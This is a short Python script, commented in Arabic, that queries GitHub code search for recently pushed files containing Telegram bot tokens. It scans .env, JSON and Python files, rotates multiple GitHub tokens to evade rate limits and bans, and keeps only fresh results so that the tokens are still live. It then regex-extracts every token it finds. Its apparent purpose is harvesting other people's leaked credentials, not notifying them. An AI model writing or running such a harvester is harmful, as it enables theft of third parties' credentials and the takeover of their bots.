import re, random
from github import Github

# يمكنك إضافة قائمة توكنات GitHub هنا لزيادة سرعة البحث وتجنب الحظر
GITHUB_TOKENS = [
    os.getenv('GITHUB_TOKEN_1', ''), 
    os.getenv('GITHUB_TOKEN_2', '')
]

def get_github_client():
    # اختيار توكن عشوائي في كل عملية بحث
    valid_tokens = [t for t in GITHUB_TOKENS if t]
    return Github(random.choice(valid_tokens)) if valid_tokens else Github(os.getenv('GITHUB_TOKEN'))

def search_for_tokens():
    g = get_github_client()
    found_tokens = []
    
    # استعلامات بحث شاملة وتغطية واسعة
    queries = [
        'bot_token filename:.env',
        'telebot language:python',
        'telegram api_key',
        'telegram_bot_token path:src',
        'TOKEN= language:python',
        'BOT_TOKEN= language:python',
        'token extension:json'
    ]
    
    for query in queries:
        try:
            # البحث في آخر 7 أيام فقط لتجنب التوكنات المحروقة
            search_query = f"{query} pushed:>2026-06-20"
            results = g.search_code(query=search_query, sort='indexed', order='desc')
            
            for file in results[:10]:
                try:
                    content = file.decoded_content.decode('utf-8')
                    # نمط ريجكس دقيق لتوكنات التيليجرام
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                except: continue
        except: continue
            
    return found_tokens
